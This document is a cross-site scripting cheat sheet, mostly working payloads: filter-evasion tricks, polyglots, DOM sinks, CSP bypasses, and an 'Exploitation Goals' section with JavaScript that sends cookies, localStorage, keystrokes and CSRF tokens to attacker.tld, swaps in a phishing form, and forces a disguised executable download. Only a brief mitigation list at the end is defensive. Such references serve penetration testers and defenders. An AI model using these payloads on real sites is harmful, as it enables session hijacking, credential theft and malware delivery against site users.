# Cross-Site Scripting (XSS)

> XSS occurs when an application includes untrusted data in a web page without proper validation or escaping, allowing an attacker to execute scripts in a victim's browser.

## Summary

- [Types](#types)
- [Tools](#tools)
- [Basic Payloads](#basic-payloads)
- [Common Event Handlers](#common-event-handlers)
- [Filter Bypass](#filter-bypass)
- [Polyglots](#polyglots)
- [DOM-Based XSS](#dom-based-xss)
- [Blind XSS](#blind-xss)
- [Exploitation Goals](#exploitation-goals)
- [CSP Bypass](#csp-bypass)
- [Mitigation](#mitigation)
- [References](#references)

## Types

| Type | Description |
|------|-------------|
| Reflected | Payload reflected in immediate response |
| Stored | Payload persisted server-side (DB, file, etc.) |
| DOM-Based | Vulnerability lives in client-side JS |
| Blind | Triggered later, by a different (often privileged) user |
| Mutation (mXSS) | Browser parser/sanitizer differences |
| Universal (UXSS) | Browser-level flaw, not site-level |

## Tools

- [XSStrike](https://github.com/s0md3v/XSStrike)
- [Dalfox](https://github.com/hahwul/dalfox)
- [BeEF](https://beefproject.com/)
- [DOMPurify (defense)](https://github.com/cure53/DOMPurify)
- [XSS Hunter Express](https://github.com/mandatoryprogrammer/xsshunter-express)

## Basic Payloads

```html
<script>alert(1)</script>
<script>alert(document.domain)</script>
<script src="//attacker.tld/x.js"></script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<svg/onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)"></iframe>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
<video><source onerror="alert(1)">
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
```

## Common Event Handlers

```
onabort onblur onchange onclick ondblclick onerror onfocus
onkeydown onkeypress onkeyup onload onmousedown onmousemove
onmouseout onmouseover onmouseup onreset onresize onselect
onsubmit onunload onbeforeunload onbeforeprint onafterprint
onhashchange onpagehide onpageshow onpopstate onstorage
ontoggle onwheel onpointerdown onpointerup onanimationstart
ontransitionend onauxclick
```

## Filter Bypass

### Case variations

```html
<ScRiPt>alert(1)</ScRiPt>
<sCRipt>alert(1)</SCripT>
```

### Encoded payloads

```html
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
%3Cscript%3Ealert(1)%3C/script%3E
&lt;script&gt;alert(1)&lt;/script&gt;
<script>alert(1)</script>
```

### Without parentheses

```html
<svg onload=alert`1`>
<script>alert`1`</script>
<script>(()=>{alert`1`})()</script>
```

### Without quotes / spaces

```html
<svg/onload=alert(1)>
<svg%0Aonload=alert(1)>
<img/src=x/onerror=alert(1)>
<iframe srcdoc=&lt;script&gt;alert(1)&lt;/script&gt;>
```

### Bypassing `alert` keyword filter

```html
<svg onload=eval(atob("YWxlcnQoMSk="))>     <!-- alert(1) -->
<svg onload=window["ale"+"rt"](1)>
<svg onload=top["alert"](1)>
<svg onload=Function("ale"+"rt(1)")()>
<svg onload=self[`al`+`ert`](1)>
```

### Bypassing tag blacklist

```html
<a href="javascript:alert(1)">click</a>
<form action="javascript:alert(1)"><button>x</button></form>
<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
<svg><script>alert&lpar;1&rpar;</script>
```

### HTML5 vector classics

```html
<video poster=javascript:alert(1)>
<isindex type=image src=1 onerror=alert(1)>
<form><button formaction=javascript:alert(1)>X
<object data="data:text/html,<script>alert(1)</script>">
<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIG9ubG9hZD0iYWxlcnQoMSkiLz4="></embed>
```

## Polyglots

```html
"><svg/onload=alert(1)>
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
"-prompt(1)-"
'-prompt(1)-'
';alert(1);//
"};alert(1);//
</script><script>alert(1)</script>
```

Famous polyglot by Gareth Heyes:

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

## DOM-Based XSS

### Sources

```
document.URL
document.documentURI
document.URLUnencoded
document.referrer
location
location.href
location.search
location.hash
location.pathname
window.name
history.pushState / replaceState
document.cookie
localStorage / sessionStorage
```

### Sinks

```
eval()
Function()
setTimeout(str, ...)
setInterval(str, ...)
element.innerHTML
element.outerHTML
document.write()
document.writeln()
location = / location.href = / location.assign() / location.replace()
jQuery: $(html), .html(), .append(), .prepend(), .after(), .before(), .replaceWith(), .wrap()
```

### Hash-based payloads

```
https://target.tld/page#<img src=x onerror=alert(1)>
https://target.tld/page#"><svg onload=alert(1)>
https://target.tld/page#javascript:alert(1)
```

## Blind XSS

```html
<script src="//xss.attacker.tld/c"></script>
"><script src=//xss.attacker.tld/c></script>
<svg onload="fetch('https://attacker.tld/?c='+document.cookie)">
```

Use XSS Hunter / Interactsh-style collectors.

## Exploitation Goals

### Steal cookies (non-HttpOnly)

```javascript
new Image().src = 'https://attacker.tld/c?='+encodeURIComponent(document.cookie);
fetch('https://attacker.tld/c?='+document.cookie);
```

### Steal localStorage / sessionStorage

```javascript
fetch('https://attacker.tld/c', {method:'POST', body:JSON.stringify(localStorage)});
```

### Keylogger

```javascript
document.addEventListener('keypress', e =>
  fetch('https://attacker.tld/k?='+String.fromCharCode(e.which)));
```

### Phishing form swap

```javascript
document.body.innerHTML = '<form action="https://attacker.tld/p" method=POST>...</form>';
```

### CSRF token exfil

```javascript
fetch('/profile').then(r=>r.text()).then(t=>{
  let m = t.match(/name="csrf" value="([^"]+)"/);
  fetch('https://attacker.tld/?t='+m[1]);
});
```

### Force file download

```javascript
let a=document.createElement('a');
a.href='https://attacker.tld/payload.exe'; a.download='invoice.pdf'; a.click();
```

## CSP Bypass

### `unsafe-inline` not present, JSONP endpoint allowed

```html
<script src="https://allowed.tld/jsonp?callback=alert"></script>
```

### Angular / AngularJS bypass

```html
<div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>
```

### `script-src 'self'` with file upload + path traversal

Upload `payload.js`, then:

```html
<script src="/uploads/../payload.js"></script>
```

### `base-uri` not set

```html
<base href="https://attacker.tld/">
<script src="x.js"></script>
```

### Dangling markup (no script needed)

```html
<img src='https://attacker.tld/?
```

(steals everything until the next quote — including CSRF tokens, secrets)

## Mitigation

- **Output encoding** matched to the context (HTML body, attribute, URL, JS, CSS).
- **Content Security Policy** with strict `script-src` (no `unsafe-inline`, no `unsafe-eval`, use nonces or hashes).
- Use **safe DOM APIs** (`textContent`, not `innerHTML`).
- Use **framework auto-escaping** (React, Angular) and avoid `dangerouslySetInnerHTML` / `bypassSecurityTrustHtml`.
- Sanitize rich-text input with **DOMPurify** server-side AND client-side.
- Set cookies `HttpOnly`, `Secure`, `SameSite=Lax` or `Strict`.

## References

- [OWASP — XSS](https://owasp.org/www-community/attacks/xss/)
- [PortSwigger — Cross-site Scripting](https://portswigger.net/web-security/cross-site-scripting)
- [HackTricks — XSS](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting)
- [Cure53 — XSS Cheat Sheet](https://github.com/cure53/H5SC)
